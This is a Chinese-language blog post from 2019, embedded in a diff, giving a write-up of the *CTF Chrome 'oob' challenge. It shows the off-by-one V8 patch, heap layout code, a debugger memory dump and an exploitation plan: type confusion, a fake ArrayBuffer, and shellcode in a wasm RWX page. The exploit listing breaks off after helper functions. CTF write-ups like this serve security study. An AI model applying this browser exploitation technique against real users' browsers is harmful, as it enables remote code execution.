@@ -1,0 +1,1211 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="Sakuraのblog" type="application/atom+xml" />
+
+
+
+
+
+
+<meta name="description" content="star ctf chrome oob writeupbug123456789101112131415161718192021+BUILTIN(ArrayOob)&amp;#123;+    uint32_t len = args.length();+    if(len &amp;gt; 2) return ReadOnlyRoots(isolate).undefined_value();//check len">
+<meta property="og:type" content="article">
+<meta property="og:title" content="star ctf chrome oob writeup">
+<meta property="og:url" content="http://eternalsakura13.com/2019/04/29/*ctf_oob/index.html">
+<meta property="og:site_name" content="Sakuraのblog">
+<meta property="og:description" content="star ctf chrome oob writeupbug123456789101112131415161718192021+BUILTIN(ArrayOob)&amp;#123;+    uint32_t len = args.length();+    if(len &amp;gt; 2) return ReadOnlyRoots(isolate).undefined_value();//check len">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2019-04-29-042454.jpg">
+<meta property="og:updated_time" content="2019-05-01T07:12:37.600Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="star ctf chrome oob writeup">
+<meta name="twitter:description" content="star ctf chrome oob writeupbug123456789101112131415161718192021+BUILTIN(ArrayOob)&amp;#123;+    uint32_t len = args.length();+    if(len &amp;gt; 2) return ReadOnlyRoots(isolate).undefined_value();//check len">
+<meta name="twitter:image" content="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2019-04-29-042454.jpg">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: 'QOPH9ID41Z',
+      apiKey: '',
+      indexName: 'sakura',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://eternalsakura13.com/2019/04/29/*ctf_oob/"/>
+
+
+
+
+
+  <title>star ctf chrome oob writeup | Sakuraのblog</title>
+  
+
+
+
+
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+            (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+          m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+  ga('create', 'UA-113420358-1', 'auto');
+  ga('send', 'pageview');
+</script>
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Sakuraのblog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://eternalsakura13.com/2019/04/29/*ctf_oob/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="sakura">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/sakura_heart.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Sakuraのblog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">star ctf chrome oob writeup</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-04-29T11:51:56+08:00">
+                2019-04-29
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/浏览器/" itemprop="url" rel="index">
+                    <span itemprop="name">浏览器</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2019/04/29/*ctf_oob/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count disqus-comment-count"
+                        data-disqus-identifier="2019/04/29/*ctf_oob/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="star-ctf-chrome-oob-writeup"><a href="#star-ctf-chrome-oob-writeup" class="headerlink" title="star ctf chrome oob writeup"></a>star ctf chrome oob writeup</h1><h2 id="bug"><a href="#bug" class="headerlink" title="bug"></a>bug</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">+BUILTIN(ArrayOob)&#123;</span><br><span class="line">+    <span class="keyword">uint32_t</span> len = args.length();</span><br><span class="line">+    <span class="keyword">if</span>(len &gt; <span class="number">2</span>) <span class="keyword">return</span> ReadOnlyRoots(isolate).undefined_value();<span class="comment">//check len&lt;=2,else return undefine</span></span><br><span class="line">+    Handle&lt;JSReceiver&gt; receiver;</span><br><span class="line">+    ASSIGN_RETURN_FAILURE_ON_EXCEPTION(</span><br><span class="line">+            isolate, receiver, Object::ToObject(isolate, args.receiver()));</span><br><span class="line">+    Handle&lt;JSArray&gt; <span class="built_in">array</span> = Handle&lt;JSArray&gt;::cast(receiver);</span><br><span class="line">+    FixedDoubleArray elements = FixedDoubleArray::cast(<span class="built_in">array</span>-&gt;elements());</span><br><span class="line">+    <span class="keyword">uint32_t</span> length = <span class="keyword">static_cast</span>&lt;<span class="keyword">uint32_t</span>&gt;(<span class="built_in">array</span>-&gt;length()-&gt;Number());</span><br><span class="line">+    <span class="keyword">if</span>(len == <span class="number">1</span>)&#123;</span><br><span class="line">+        <span class="comment">//read</span></span><br><span class="line">+        <span class="keyword">return</span> *(isolate-&gt;factory()-&gt;NewNumber(elements.get_scalar(length)));----&gt;length off by one</span><br><span class="line">+    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">+        <span class="comment">//write</span></span><br><span class="line">+        Handle&lt;Object&gt; value;</span><br><span class="line">+        ASSIGN_RETURN_FAILURE_ON_EXCEPTION(</span><br><span class="line">+                isolate, value, Object::ToNumber(isolate, args.at&lt;Object&gt;(<span class="number">1</span>)));</span><br><span class="line">+        elements.<span class="built_in">set</span>(length,value-&gt;Number());----&gt;length off by one</span><br><span class="line">+        <span class="keyword">return</span> ReadOnlyRoots(isolate).undefined_value();</span><br><span class="line">+    &#125;</span><br><span class="line">+&#125;</span><br></pre></td></tr></table></figure>
+<p>可以看到在length这里有一个off-by-one</p>
+<p>另外，这里有一个非预期的UAF，其实在Object::ToNumber(isolate, args.at<object>(1)))可以触发回调，通过valueof或者Symbol.toPrimitive可以在这里将array的length改成0之后强制GC将其回收掉，然后重新喷内存占位，由于我们之前缓存了length，可以一开始用一个非常大的length，而此时占位的array是我们可控的，可以占位一个length比较小的array，于是就可以任意OOB，而不是off by one。<br>类似的做法参考CVE-2017-5053，应该也是可以这么利用的，我没做太多尝试，有兴趣的同学可以试一下，不过显然这种做法会非常不稳定。</object></p>
+<h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><p>v8通过map来判断类型，通过off-by-one来修改map即可产生type confusion</p>
+<h2 id="trick"><a href="#trick" class="headerlink" title="trick"></a>trick</h2><h3 id="splice"><a href="#splice" class="headerlink" title="splice"></a>splice</h3><p>通过splice控制array的内存排布紧邻。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> ab = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x1000</span>);</span><br><span class="line"><span class="keyword">var</span> a = [<span class="number">1.1</span>, <span class="number">1.1</span>, <span class="number">1.1</span>, <span class="number">1.1</span>];</span><br><span class="line"><span class="keyword">var</span> b = [&#123;&#125;, &#123;&#125;, ab, <span class="number">2.2</span>, <span class="number">2.2</span>];</span><br><span class="line"><span class="keyword">var</span> c = [<span class="number">3.3</span>, <span class="number">3.3</span>, <span class="number">3.3</span>, <span class="number">3.3</span>, <span class="number">3.3</span>];</span><br><span class="line"><span class="comment">//布局内存，让array连续存放</span></span><br><span class="line">a = a.splice(<span class="number">0</span>);</span><br><span class="line">b = b.splice(<span class="number">0</span>);</span><br><span class="line">c = c.splice(<span class="number">0</span>);</span><br></pre></td></tr></table></figure></p>
+<p>test如下：<br>可以看到如图所示的内存布局：<br>a elements的length位置存放的就是a obj的map了，于是a.oob(xxx)就可以将a的map给覆盖掉。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">//0x33a1055ce0e1-&gt;0x33a1055ce0b1</span><br><span class="line">//0x33a1055ce139-&gt;0x33a1055ce101</span><br><span class="line">//0x33a1055ce191-&gt;0x33a1055ce159</span><br><span class="line"></span><br><span class="line">// x/60gx 0x33a1055ce0b1-1</span><br><span class="line">// 0x33a1055ce0b0: &#123;0x000033a10f4814f9 0x0000000400000000-&gt;a elements</span><br><span class="line">// 0x33a1055ce0c0: 0x3ff199999999999a 0x3ff199999999999a</span><br><span class="line">// 0x33a1055ce0d0: 0x3ff199999999999a 0x3ff199999999999a&#125;</span><br><span class="line">// 0x33a1055ce0e0: &#123;0x000033a14e0c2ed9 0x000033a10f480c71-&gt;a obj</span><br><span class="line">// 0x33a1055ce0f0: 0x000033a1055ce0b1 0x0000000400000000&#125;</span><br><span class="line">// 0x33a1055ce100: &#123;0x000033a10f480801 0x0000000500000000-&gt;b elements</span><br><span class="line">// 0x33a1055ce110: 0x000033a1055cdfc9 0x000033a1055ce001</span><br><span class="line">// 0x33a1055ce120: 0x000033a1055cdf01 0x000033a12d09f3f9</span><br><span class="line">// 0x33a1055ce130: 0x000033a12d09f409&#125;</span><br><span class="line">//                                    &#123;0x000033a14e0c2f79-&gt;b obj</span><br><span class="line">// 0x33a1055ce140: 0x000033a10f480c71 0x000033a1055ce101</span><br><span class="line">// 0x33a1055ce150: 0x0000000500000000&#125;</span><br><span class="line">//                                    &#123;0x000033a10f4814f9-&gt;c elements</span><br><span class="line">// 0x33a1055ce160: 0x0000000500000000 0x400a666666666666</span><br><span class="line">// 0x33a1055ce170: 0x400a666666666666 0x400a666666666666</span><br><span class="line">// 0x33a1055ce180: 0x400a666666666666 0x400a666666666666&#125;</span><br><span class="line">// 0x33a1055ce190: &#123;0x000033a14e0c2ed9 0x000033a10f480c71-&gt;c obj</span><br><span class="line">// 0x33a1055ce1a0: 0x000033a1055ce159 0x0000000500000000&#125;</span><br><span class="line">// 0x33a1055ce1b0: 0xdeadbeedbeadbeef 0xdeadbeedbeadbeef</span><br><span class="line">// 0x33a1055ce1c0: 0xdeadbeedbeadbeef 0xdeadbeedbeadbeef</span><br><span class="line">// 0x33a1055ce1d0: 0xdeadbeedbeadbeef 0xdeadbeedbeadbeef</span><br></pre></td></tr></table></figure></p>
+<h3 id="gc"><a href="#gc" class="headerlink" title="gc"></a>gc</h3><p>在要fake的arraybuffer的前后两次gc，使其内存分布更稳定。</p>
+<h3 id="debug"><a href="#debug" class="headerlink" title="debug"></a>debug</h3><p>调试的话，直接在对应版本的v8 release上调试，然后写到html里，放到chrome里就行了，偏移什么的都没有改变。<br>也可以直接gdb attach到chrome里调试。</p>
+<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><p>利用思路非常简单<br>首先分配两个array，一个double array，一个object array<br>然后通过覆盖object array的map为double map，就可以将其中的用户空间对象leak出来。<br>然后在array的elments去fake一个arraybuffer。<br>然后通过将double array的map覆盖成object array，就可以将fake好的arraybuffer给当成object给取出来。<br>而这个fake的arraybuffer的内容是我们可控的，于是就可以任意地址读写了。<br>接下来就是找到wasm_func里rwx的地址，将shellcode写入执行即可。<br>我的exp写的比较dirty。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">String.prototype.padLeft =</span><br><span class="line">Number.prototype.padLeft = function(total, pad) &#123;</span><br><span class="line">  return (Array(total).join(pad || 0) + this).slice(-total);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Return the hexadecimal representation of the given byte array.</span><br><span class="line">function hexlify(bytes) &#123;</span><br><span class="line">    var res = [];</span><br><span class="line">    for (var i = 0; i &lt; bytes.length; i++)&#123;</span><br><span class="line">        //print(bytes[i].toString(16));</span><br><span class="line">        res.push((&apos;0&apos; + bytes[i].toString(16)).substr(-2));</span><br><span class="line">    &#125;</span><br><span class="line">    return res.join(&apos;&apos;);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Return the binary data represented by the given hexdecimal string.</span><br><span class="line">function unhexlify(hexstr) &#123;</span><br><span class="line">    if (hexstr.length % 2 == 1)</span><br><span class="line">        throw new TypeError(&quot;Invalid hex string&quot;);</span><br><span class="line"></span><br><span class="line">    var bytes = new Uint8Array(hexstr.length / 2);</span><br><span class="line">    for (var i = 0; i &lt; hexstr.length; i += 2)</span><br><span class="line">        bytes[i/2] = parseInt(hexstr.substr(i, 2), 16);</span><br><span class="line"></span><br><span class="line">    return bytes;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function hexdump(data) &#123;</span><br><span class="line">    if (typeof 